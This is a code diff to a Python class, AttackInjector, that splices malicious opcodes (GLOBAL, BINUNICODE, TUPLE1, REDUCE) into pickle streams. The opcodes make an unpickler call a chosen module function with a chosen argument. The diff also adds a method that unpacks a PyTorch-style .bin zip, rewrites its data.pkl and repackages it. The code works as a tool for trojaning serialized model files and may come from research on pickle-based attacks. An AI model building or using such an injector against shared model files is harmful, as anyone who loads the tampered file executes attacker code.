@@ -1,6 +1,9 @@
+import os
+import shutil
 import struct
 from pickletools import genops
 from pickletools import opcodes as opcode_library
+from tempfile import NamedTemporaryFile
 
 # Opcode indices within opcode_library used while injecting attacks
 BINUNICODE = 21
@@ -16,9 +19,11 @@ EVAL_EXEC_MEMO_LEN = 4
 GLOBAL_END = b"\x0A"
 BYTE_MAX = 0xFF
 
+ZIP_PICKLE = "archive/data.pkl"
+
 class AttackInjector():
-    def __init__(self, pickle_extractor):
-        self.pickle_extractor = pickle_extractor
+    def __init__(self, bin_io):
+        self.bin_io = bin_io
 
     @staticmethod
     def write_global(last_memo_index, out_pickle, module_str):
@@ -40,7 +45,7 @@ class AttackInjector():
         return 0
 
     @staticmethod
-    def write_get(last_memo_index, out_pickle, memo_ind):
+    def write_get(last_memo_index, out_pickle):
         """
 		Params: 
 			last_memo_index: Index that will be written as part of get command
@@ -56,7 +61,7 @@ class AttackInjector():
         byte_length = 1 if last_memo_index <= BYTE_MAX else 4
         
         out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
-        out_pickle.write(memo_ind.to_bytes(byte_length, byteorder="little"))
+        out_pickle.write(last_memo_index.to_bytes(byte_length, byteorder="little"))
 
         return 1
 
@@ -101,7 +106,6 @@ class AttackInjector():
         return 0
 
     @staticmethod
-    
     def write_simple_opcode(last_memo_index, out_pickle, opcode_lib_ind):
         """
 		Params: 
@@ -120,7 +124,7 @@ class AttackInjector():
 
     @staticmethod
     def memo_inject_attack(last_memo_index, out_pickle, module_str):
-        AttackInjector.write_global(None, module_str, out_pickle)    # GLOBAL     <module_str>
+        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL     <module_str>
         AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
         AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP
 
@@ -128,7 +132,7 @@ class AttackInjector():
     
     @staticmethod
     def sequential_module_attack_with_memo(last_memo_index, out_pickle, module_str, arg_str):
-        AttackInjector.write_global(None, module_str, out_pickle)    # GLOBAL                 <module_str>
+        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL                 <module_str>
         AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
         AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE             <arg_str>
         AttackInjector.write_put(last_memo_index + 2, out_pickle)    # BINPUT/LONG_BINPUT     N + 2
@@ -142,7 +146,7 @@ class AttackInjector():
 
     @staticmethod
     def sequential_module_attack_without_memo(last_memo_index, out_pickle, module_str, arg_str):
-        AttackInjector.write_global(None, module_str, out_pickle)    # GLOBAL         <module_str>
+        AttackInjector.write_global(None, out_pickle, module_str)    # GLOBAL         <module_str>
         AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE     <arg_str>
         AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
         AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
@@ -152,7 +156,7 @@ class AttackInjector():
     
     @staticmethod
     def module_attack_using_memo(last_memo_index, out_pickle, memo_ind, arg_str):
-        AttackInjector.write_get(last_memo_index + 1, out_pickle, memo_ind)    # BINGET/LONG_BINGET     N + 2
+        AttackInjector.write_get(memo_ind, out_pickle)    # BINGET/LONG_BINGET     N + 2
         AttackInjector.write_binunicode(None, out_pickle, arg_str)             # BINUNICODE             <arg_str>
         AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)           # TUPLE1
         AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)           # REDUCE
@@ -160,7 +164,7 @@ class AttackInjector():
 
         return 0
 
-    def _get_all_commands(in_pickle):
+    def _get_all_commands(self, in_pickle):
         """
 		Params: 
 			in_pickle: bytes object containing pickle file
@@ -183,7 +187,7 @@ class AttackInjector():
 
         return opcodes, args, positions
 
-    def _get_last_memo_index(attack_index, opcodes, args):
+    def _get_last_memo_index(self, attack_index, opcodes, args):
         """
 		Params: 
 			attack_index: Index we're attack at
@@ -202,7 +206,7 @@ class AttackInjector():
 
         return last_memo_index
 
-    def _increment_memo_args(start_index, opcodes, args):
+    def _increment_memo_args(self, start_index, memo_offset, opcodes, args):
         """
 		Params: 
 			attack_index: Index we're starting our incrementation by
@@ -216,10 +220,10 @@ class AttackInjector():
 		"""
         # Increment the remaining memo records
         incremented_memo_record = False
-        for i in range(start_index, -1):
+        for i in range(start_index, len(opcodes)):
             if opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT":
                 incremented_memo_record = True
-                args[i] += EVAL_EXEC_MEMO_LEN
+                args[i] += memo_offset
         
         return incremented_memo_record
     
@@ -241,19 +245,20 @@ class AttackInjector():
 
                 if opcode_is_get and rem_args[i] > last_memo_index:
                     # Rewrite get
-                    self._write_get(rem_args[i] + attack_len, out_pickle)
+                    AttackInjector.write_get(rem_args[i], out_pickle)
                 elif opcode_is_memo:
                     # Rewrite memo
-                    self._write_put(rem_args[i] + attack_len, out_pickle)
+                    AttackInjector.write_put(rem_args[i], out_pickle)
                 else:
                     # If this opcode is not special, just copy data from pickle file
                     in_pickle.seek(rem_pos[i])
-                    bytes_read = rem_pos[i + 1] - rem_pos[i] if i != len(rem_opcodes) - 1 else -1
+                    bytes_read = rem_pos[i + 1] - rem_pos[i] if i != len(rem_opcodes) - 1 else 1
                     out_pickle.write(in_pickle.read(bytes_read))
         else:
             # Trivial case: no memoization, no modification
             in_pickle.seek(attack_pos)
             out_pickle.write(in_pickle.read())
+
 
     def inject_attacks(self, attacks, attack_indices, attack_args, in_pickle, out_pickle):
         """
@@ -266,12 +271,10 @@ class AttackInjector():
         memo_offset = 0
         last_memo_index = -1
         incremented_memo_args = False
+        memo_mod_start = []
         for attack, attack_index, attack_args in zip(attacks, attack_indices, attack_args):
             # Find what memo record, if any, we left off on
             last_memo_index = self._get_last_memo_index(attack_index, opcodes, args) + memo_offset
-
-            # Increment the remaining memo records
-            incremented_memo_args = self._increment_memo_args(attack_index, opcodes, args)
 
             # Next, copy everything from the previous pickle file into a new file
             attack_pos = pos[attack_index]
@@ -285,6 +288,15 @@ class AttackInjector():
             seek_index = attack_pos
             memo_offset += attack_memo_len
 
+            # Increment the remaining memo records
+            incremented_memo_args = self._increment_memo_args(attack_index, memo_offset, opcodes, args)
+
+            # Record the start of each memo modification
+            if attack_memo_len > 0:
+                memo_mod_start.append(last_memo_index + 1)
+            else:
+                memo_mod_start.append(None)
+
         # Reconstruct the rest of the pickle file
         self._reconstruct_pickle_end(
             attack_indices[-1],
@@ -297,3 +309,42 @@ class AttackInjector():
             args,
             pos
         )
+
+        return memo_mod_start
+
+    def inject_attacks_bin(self, attacks, attack_indices, attack_args, in_bin_dir, out_bin_dir):
+        # Extract our bin file so we can manipulate its contents
+        bin_filename = os.path.basename(in_bin_dir)
+        bin_dirname = os.path.dirname(in_bin_dir)
+        file_type = self.bin_io.extract(bin_dirname, bin_filename)
+
+        # Proceed to open pickle file of extracted bin and set up temp in pickle
+        if file_type == "zip":
+            in_pickle = open(f"{bin_dirname}/{ZIP_PICKLE}", "rb")
+        else:
+            in_pickle = None
+        out_pickle_temp = NamedTemporaryFile()
+
+        # Injection time (modifies out_pickle)
+        out_pickle_write = open(out_pickle_temp.name, "wb")
+        memo_mod_start = self.inject_attacks(
+            attacks,
+            attack_indices,
+            attack_args,
+            in_pickle,
+            out_pickle_write
+        )
+
+        # Inject modified pickle file into bin and create modified bin
+        in_pickle.close()
+        out_pickle_write.close()
+        out_pickle_read = open(out_pickle_temp.name, "rb")
+        self.bin_io.inject_pickle_and_compress(
+            bin_dirname,
+            file_type,
+            out_pickle_read,
+            out_bin_dir
+        )
+        shutil.rmtree(f"{bin_dirname}/archive") # Remove working dir
+
+        return memo_mod_start
